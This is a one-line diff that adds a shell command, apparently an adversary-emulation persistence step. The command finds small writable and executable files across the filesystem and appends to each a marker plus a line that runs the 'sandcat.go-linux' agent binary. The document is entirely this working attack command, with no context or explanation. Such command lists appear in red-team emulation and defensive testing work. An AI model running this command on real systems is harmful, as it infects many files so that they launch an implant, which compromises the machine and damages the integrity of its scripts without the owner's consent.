@@ -1,0 +1,1 @@
+find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT\n" "chmod +x sandcat.go-linux && sandcat.go-linux" >> "{}"; ls "{}" ' \; | echo "complete"
